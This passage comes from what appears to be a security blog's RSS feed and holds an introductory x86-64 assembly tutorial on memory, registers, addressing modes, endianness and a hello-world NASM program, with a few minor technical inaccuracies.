&lt;li&gt;&lt;strong&gt;Focus:&lt;/strong&gt; Malware Development, Reverse Engineering, Threat Intelligence, System Architecture&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    <item>
      <title>Assembly Basics</title>
      <link>http://localhost:1313/archive/reverse-engineering-and-binary-exploitation/assembly-basics/</link>
      <pubDate>Sat, 12 Jul 2025 00:00:00 +0000</pubDate>

      <guid>http://localhost:1313/archive/reverse-engineering-and-binary-exploitation/assembly-basics/</guid>
      <description>&lt;hr&gt;

&lt;h2 id=&#34;description-because-to-build-a-house-you-must-first-lay-its-foundation&#34;&gt;
  description: &amp;hellip;because to build a house, you must first lay its foundation.
  &lt;a href=&#34;#description-because-to-build-a-house-you-must-first-lay-its-foundation&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;h1 id=&#34;-assembly-basics&#34;&gt;
   Assembly Basics
  &lt;a href=&#34;#-assembly-basics&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;assembly&#34;&gt;
  Assembly
  &lt;a href=&#34;#assembly&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Assembly language&lt;/strong&gt; at its basic is an symbolic language that directly ties a language machine can understand and a language that is easy for humans to understand.&lt;/p&gt;
&lt;p&gt;An instruction like &lt;code&gt;add rax, 1&lt;/code&gt; is simpler than machine shellcode equivalent &lt;code&gt;4883C001&lt;/code&gt; or binary machine code &lt;code&gt;01001000 10000011 11000000 00000001&lt;/code&gt;&lt;/p&gt;</description>
      <content>&lt;hr&gt;

&lt;h2 id=&#34;description-because-to-build-a-house-you-must-first-lay-its-foundation&#34;&gt;
  description: &amp;hellip;because to build a house, you must first lay its foundation.
  &lt;a href=&#34;#description-because-to-build-a-house-you-must-first-lay-its-foundation&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;h1 id=&#34;-assembly-basics&#34;&gt;
   Assembly Basics
  &lt;a href=&#34;#-assembly-basics&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h1&gt;

&lt;h2 id=&#34;assembly&#34;&gt;
  Assembly
  &lt;a href=&#34;#assembly&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;Assembly language&lt;/strong&gt; at its basic is an symbolic language that directly ties a language machine can understand and a language that is easy for humans to understand.&lt;/p&gt;
&lt;p&gt;An instruction like &lt;code&gt;add rax, 1&lt;/code&gt; is simpler than machine shellcode equivalent &lt;code&gt;4883C001&lt;/code&gt; or binary machine code &lt;code&gt;01001000 10000011 11000000 00000001&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;There are different processor architectures and each needs a program to be written on different sets of instructions. This is where low-level languages like &lt;code&gt;C&lt;/code&gt; come in.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;C&lt;/code&gt; has a complier that compiles a source code to a variety of architectures without writing different source code for each.&lt;/p&gt;

&lt;h3 id=&#34;computer-architecture&#34;&gt;
  Computer Architecture
  &lt;a href=&#34;#computer-architecture&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The following is the Von Neumann Architecture of modern computers&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/vonnewman.png&#34; alt=&#34;Von Neumann Architecture&#34;  /&gt;
  &lt;/figure&gt;


&lt;h3 id=&#34;memory&#34;&gt;
  Memory
  &lt;a href=&#34;#memory&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Memory is where the temporary data and instructions reside when a program is running/doing calculations. This is the first place a CPU goes to retrieve and process data. Very fast but also volatile&lt;/p&gt;
&lt;p&gt;There are two types of memory:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Cache&lt;/li&gt;
&lt;li&gt;Random Access Memory or RAM&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;cache&#34;&gt;
  Cache
  &lt;a href=&#34;#cache&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Cache memory resides withing the CPU and is extremely fast compared to RAM as it runs on the same clock speed. However it is very limited in size and memory.&lt;/p&gt;
&lt;p&gt;There are three levels of cache memory, sorted by their physical closeness to CPU&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Level&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Explanation&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Level 1 Cache&lt;/td&gt;
          &lt;td&gt;Usually in kilobytes, the fastest memory available, located in each CPU core. (Only registers are faster.)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Level 2 Cache&lt;/td&gt;
          &lt;td&gt;Usually in megabytes, extremely fast (but slower than L1), shared between all CPU cores.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Level 3 Cache&lt;/td&gt;
          &lt;td&gt;Usually in megabytes (larger than L2), faster than RAM but slower than L1/L2. (Not all CPUs use L3.)&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;ram&#34;&gt;
  RAM
  &lt;a href=&#34;#ram&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Ram is a larger cache memory and much slower than Cache memory. It&amp;rsquo;s also residing physically further from the CPU, hence used after Cache memory.&lt;/p&gt;
&lt;p&gt;When a program starts, all of its data and instructions are loaded to the RAM(from storage) to be accessed whenever necessary by the CPU.&lt;/p&gt;
&lt;p&gt;RAM is split into four main segments&lt;/p&gt;

  &lt;figure class=&#34;left&#34;&gt;
    &lt;img src=&#34;http://localhost:1313/.gitbook/assets/RAMsegments.png&#34; alt=&#34;RAM Segments&#34;  /&gt;
  &lt;/figure&gt;

&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;strong&gt;Segment&lt;/strong&gt;&lt;/th&gt;
          &lt;th&gt;&lt;strong&gt;Explanation&lt;/strong&gt;&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Stack&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Has a Last-in First-out (LIFO) design and is fixed in size. Data in it can only be accessed in a specific order by push-ing and pop-ing data.&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Heap&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Has a hierarchical design and is therefore much larger and more versatile in storing data, as data can be stored and retrieved in any order. However, this makes the heap slower than the Stack.&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Data&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Has two parts: Data, which is used to hold variables, and .bss, which is used to hold unassigned variables (i.e., buffer memory for later allocation).&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Text&lt;/td&gt;
          &lt;td&gt;&lt;em&gt;Main assembly instructions are loaded into this segment to be fetched and executed by the CPU.&lt;/em&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;io-storage&#34;&gt;
  I/O Storage
  &lt;a href=&#34;#io-storage&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;Input/Output devices are storage unit, keyboard, screen etc. The processor can access and control IO devices using &lt;code&gt;Bus Interfaces&lt;/code&gt;. These are metallic &amp;lsquo;highways&amp;rsquo; on a PCB that help transmission of electrical charges as binary data.&lt;/p&gt;
&lt;p&gt;Each Bus has a capacity of how much electric charge(or bits) it can carry at a given moment. This is usually a multiple of a nibble(half of a byte) up to 128-bits.&lt;/p&gt;
&lt;p&gt;Bus interfaces are used to access memory and components outside the CPU. This is why there are countless bus interfaces around the CPU.&lt;/p&gt;
&lt;p&gt;By speed here are memory components sorted&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Component&lt;/th&gt;
          &lt;th&gt;Speed&lt;/th&gt;
          &lt;th&gt;Size&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Registers&lt;/td&gt;
          &lt;td&gt;Fastest&lt;/td&gt;
          &lt;td&gt;Bytes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;L1 Cache&lt;/td&gt;
          &lt;td&gt;Fastest, after Registers&lt;/td&gt;
          &lt;td&gt;Kilobytes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;L2 Cache&lt;/td&gt;
          &lt;td&gt;Fast after L1&lt;/td&gt;
          &lt;td&gt;Megabytes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;L3 Cache&lt;/td&gt;
          &lt;td&gt;Slower than all of the above&lt;/td&gt;
          &lt;td&gt;Megabytes&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;RAM&lt;/td&gt;
          &lt;td&gt;Slower than all of the above&lt;/td&gt;
          &lt;td&gt;GB-TB&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Storage&lt;/td&gt;
          &lt;td&gt;Slowest&lt;/td&gt;
          &lt;td&gt;TB+&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&#34;cpu-architecture&#34;&gt;
  CPU Architecture
  &lt;a href=&#34;#cpu-architecture&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;
&lt;p&gt;CPU is the main processing unit within a computer. The CPU contains the &lt;code&gt;Control Unit(CU)&lt;/code&gt;, which is in charge of moving and controlling data and there&amp;rsquo;s &lt;code&gt;Arithmetic/Logic Unit(ALU)&lt;/code&gt;, which is in charge of performing arithmetic and logical calculations as requested.&lt;/p&gt;
&lt;p&gt;Efficiency of a CPU and which instructions it can run depends on its &lt;code&gt;Instruction Set Architecture(ISA)&lt;/code&gt;. &lt;code&gt;RISC&lt;/code&gt; architecture is based on processing more simple instructions, which takes more cycles but each cycle is shorter and takes less power. &lt;code&gt;CISC&lt;/code&gt; architecture is based on processing fewer, more complex instructions, which takes less instructions and fewer cycles but each instruction takes more time and power.&lt;/p&gt;
&lt;p&gt;A &lt;code&gt;clock speed&lt;/code&gt; refers to each tick given one cycle of an operation that it takes to process a basic instruction, like fetching an address or storing one.&lt;/p&gt;
&lt;p&gt;The frequency of cycles is measured in &lt;code&gt;Hertz&lt;/code&gt;. Example: CPU speed with 2.0GHz means that it can run 2 billion cycles every second(per core).&lt;/p&gt;

&lt;h3 id=&#34;instruction-cycle&#34;&gt;
  Instruction Cycle
  &lt;a href=&#34;#instruction-cycle&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;An &lt;code&gt;Instruction Cycle&lt;/code&gt; is the cycle it takes the CPU to process a single machine instruction It consists of four stages:&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;1. Fetch&lt;/th&gt;
          &lt;th&gt;Takes the next instruction&amp;rsquo;s address from the Instruction Address Register (IAR), which tells it where the next instruction is located.&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;2. Decode&lt;/td&gt;
          &lt;td&gt;Takes the instruction from the IAR, and decodes it from binary to see what is required to be executed.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3. Execute&lt;/td&gt;
          &lt;td&gt;Fetch instruction operands from register/memory, and process the instruction in the ALU or CU.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;4. Store&lt;/td&gt;
          &lt;td&gt;Store the new value in the destination operand.&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;An example:&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ol&gt;
&lt;li&gt;Fetch the instruction from the &lt;code&gt;rip&lt;/code&gt; register, &lt;code&gt;48 83 C0 01&lt;/code&gt; (in binary).&lt;/li&gt;
&lt;li&gt;Decode &lt;code&gt;48 83 C0 01&lt;/code&gt; to know it needs to perform an &lt;code&gt;add&lt;/code&gt; of &lt;code&gt;1&lt;/code&gt; to the value at &lt;code&gt;rax&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Get the current value at &lt;code&gt;rax&lt;/code&gt; (by &lt;code&gt;CU&lt;/code&gt;), add &lt;code&gt;1&lt;/code&gt; to it (by the &lt;code&gt;ALU&lt;/code&gt;).&lt;/li&gt;
&lt;li&gt;Store the new value back to &lt;code&gt;rax&lt;/code&gt;.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;each processor has its own set of instructions and corresponding machine code. So, each processor type has its Instruction Set Architectures, and each architecture can be further represented in several syntax formats&lt;/p&gt;

&lt;h3 id=&#34;instruction-set-architectures&#34;&gt;
  Instruction Set Architectures
  &lt;a href=&#34;#instruction-set-architectures&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;ISA specifies the syntax and semantics of the assembly language. It consists of&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Instructions - &lt;code&gt;add rax, 1, mov rsp, rax, push rax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Registers - &lt;code&gt;rax, rsp, rip&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Memory Addresses - &lt;code&gt;0xffffffffaa8a25ff, 0x44d0, $rax&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Data Types - &lt;code&gt;byte, word, double word&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;There are two main ISA that are used widely:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;CISC - used by Intel and AMD processors&lt;/li&gt;
&lt;li&gt;RISC - used in ARM and Apple processors, in most smartphones and some laptops&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;registers-addresses-and-data-types&#34;&gt;
  Registers, Addresses and Data Types
  &lt;a href=&#34;#registers-addresses-and-data-types&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;h4 id=&#34;registers&#34;&gt;
  Registers
  &lt;a href=&#34;#registers&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;CPU has a set of registers, which are the fastest components on any computer, because they are built within the CPU core. Regardless, registers are limited in size and can hold only a few bytes of data at a time. The following are the essential registers&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Data Registers&lt;/th&gt;
          &lt;th&gt;Pointer Registers&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;rax (primary)&lt;/td&gt;
          &lt;td&gt;rbp (Base pointer)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;rbx (primary)&lt;/td&gt;
          &lt;td&gt;rsp (Stack pointer)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;rcx (primary)&lt;/td&gt;
          &lt;td&gt;rip (Instruction Pointer)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;rdx (primary)&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;rdi (destination)&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;rsi (source)&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;r8 (secondary)&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;r9 (secondary)&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;r10 (secondary)&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;&lt;em&gt;Note: letter r at the beginning of registers denote that these are 64-bit registers. letter e denotes that they are 32-bit registers . Like &lt;code&gt;eax&lt;/code&gt; or &lt;code&gt;ebp&lt;/code&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Data Registers&lt;/strong&gt; are used for storing instructions/syscalls.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Pointer Registers&lt;/strong&gt; are used to store specific memory address pointers &lt;strong&gt;rbp&lt;/strong&gt; - points to beginning of the Stack &lt;strong&gt;rsp&lt;/strong&gt; - points to the current location within the Stack &lt;strong&gt;rip&lt;/strong&gt; - holds the address for the next instruction&lt;/p&gt;
&lt;p&gt;Each register can be further divided into smaller sub-registers containing lower bits: 8-bits, 16-bits, 32-bits&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Size&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;8-bit&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;al&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;16-bit&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;ax&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;32-bit&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;eax&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;64-bit&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;rax&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;memory-addresses&#34;&gt;
  Memory Addresses
  &lt;a href=&#34;#memory-addresses&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;Memory is segmented into memory regions, like the Stack, Heap and other program and kernel-specific regions. Each segment has specific read, write, execute permissions that specifies what can be done in that segment.&lt;/p&gt;
&lt;p&gt;whenever an instruction is called, the first step is to fetch the instruction from the address it&amp;rsquo;s located at. Several types of address fetching in x86&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Addressing mode&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
          &lt;th&gt;Example&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;Immediate&lt;/td&gt;
          &lt;td&gt;The value is given withing the instruction&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;add 2&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Register&lt;/td&gt;
          &lt;td&gt;The register that holds the value is given to instruction&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;add rax&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Direct&lt;/td&gt;
          &lt;td&gt;The full address is given in the instruction&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;call 0xffffffffaa8a25ff&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Indirect&lt;/td&gt;
          &lt;td&gt;A reference pointer is given in the instruction&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;call 0x44d000&lt;/code&gt; or &lt;code&gt;call [rax]&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;Stack&lt;/td&gt;
          &lt;td&gt;Address on top of the stack is passed to the instruction&lt;/td&gt;
          &lt;td&gt;&lt;code&gt;add rsp&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h4 id=&#34;endianness&#34;&gt;
  Endianness
  &lt;a href=&#34;#endianness&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;An address endianness is the order of its bytes in which they are stored or retrieved from memory. There are two types of endianness: &lt;code&gt;Little-Endian&lt;/code&gt; and &lt;code&gt;Big-Endian&lt;/code&gt;. With &lt;strong&gt;Little-Endian&lt;/strong&gt; processors, the little-end byte of the address is retrieved right-to-left Example: an address &lt;code&gt;0x0011223344556677&lt;/code&gt; will be stored in reverse -&amp;gt; &lt;code&gt;0x7766554433221100&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;With &lt;strong&gt;Big-Endian&lt;/strong&gt; processors, the big-end byte is retrieved left-to-right&lt;/p&gt;
&lt;p&gt;In little endian, if we were to push an address or a string with Assembly, we would have to push it in reverse. For example, if we want to store the word &lt;code&gt;Hello&lt;/code&gt;, we would push its bytes in reverse: &lt;code&gt;o&lt;/code&gt;, &lt;code&gt;l&lt;/code&gt;, &lt;code&gt;l&lt;/code&gt;, &lt;code&gt;e&lt;/code&gt;, and finally &lt;code&gt;H&lt;/code&gt;.&lt;/p&gt;

&lt;h4 id=&#34;data-types&#34;&gt;
  Data Types
  &lt;a href=&#34;#data-types&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h4&gt;
&lt;p&gt;x86 architecture supports several data types&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Data type&lt;/th&gt;
          &lt;th&gt;Length&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;byte&lt;/td&gt;
          &lt;td&gt;8 bits&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;word&lt;/td&gt;
          &lt;td&gt;16 bits&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;dword&lt;/td&gt;
          &lt;td&gt;32 bits&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;qword&lt;/td&gt;
          &lt;td&gt;64 bits&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&#34;assembly-file-structure&#34;&gt;
  Assembly File Structure
  &lt;a href=&#34;#assembly-file-structure&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h2&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;assembly&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;         global  _start

         section .data
message: db      &amp;#34;Hello&amp;#34;

         section .text
_start:
         mov     rax, 1
         mov     rdi, 1
         mov     rsi, message
         mov     rdx, 18
         syscall

         mov     rax, 60
         mov     rdi, 0
         syscall&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;In the example above we have&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Section&lt;/th&gt;
          &lt;th&gt;Explanation&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;global _start&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;This is a &lt;code&gt;directive&lt;/code&gt; for the code to start executing at the &lt;code&gt;_start&lt;/code&gt; label defined below&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;section .data&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;This is a &lt;code&gt;data&lt;/code&gt; section, which should contain all of the variables&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;section .text&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;This is a &lt;code&gt;text&lt;/code&gt; section containing all of the code that should be executed&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&#34;directives&#34;&gt;
  Directives
  &lt;a href=&#34;#directives&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;An assembly code runs line-by-line. Directives like &lt;code&gt;global _start&lt;/code&gt; indicates the machine where to start processing instructions. So, the machine goes to the &lt;code&gt;_start&lt;/code&gt; label and starts executing the instructions there.&lt;/p&gt;

&lt;h3 id=&#34;variables&#34;&gt;
  Variables
  &lt;a href=&#34;#variables&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;.data&lt;/code&gt; section holds variables that will be loaded into memory once the program is run&lt;/p&gt;
&lt;p&gt;Variables can be defined using &lt;code&gt;db&lt;/code&gt; for a list of bytes, &lt;code&gt;dw&lt;/code&gt; for a list of words and &lt;code&gt;dd&lt;/code&gt; for a list of digits and so on. it is also possible to label variables for later usage&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;Instruction&lt;/th&gt;
          &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;db 0x0a&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;defines the byte &lt;code&gt;0x0a&lt;/code&gt; which is a newline&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;message db 0x41, 0x42, 0x43, 0x0a&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Defines the label &lt;code&gt;message =&amp;gt; abc\n&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;code&gt;message db &amp;quot;Hello World!&amp;quot;, 0x0a&lt;/code&gt;&lt;/td&gt;
          &lt;td&gt;Defines the label &lt;code&gt;message =&amp;gt; Hello World!\n&lt;/code&gt;&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;In an example below&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&#34;highlight-wrapper&#34;&gt;
  &lt;div class=&#34;highlight-toolbar&#34;&gt;
    &lt;span class=&#34;item&#34;&gt;
      &lt;span class=&#34;label&#34;&gt;Lang:&lt;/span&gt;
      &lt;span class=&#34;name&#34;&gt;assembly&lt;/span&gt;
    &lt;/span&gt;


    &lt;button class=&#34;item right outline brighter hide js-btn-copy-code&#34;&gt;Copy&lt;/button&gt;
  &lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;section .data
    message db &amp;#34;Hello World!&amp;#34;, 0x0a
    length  equ $-message&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code&gt;$&lt;/code&gt; token indicates the current distance from the beginning of the current section.&lt;/p&gt;

&lt;h3 id=&#34;code&#34;&gt;
  Code
  &lt;a href=&#34;#code&#34; class=&#34;hanchor&#34; ariaLabel=&#34;Anchor&#34;&gt;&lt;/a&gt;
&lt;/h3&gt;
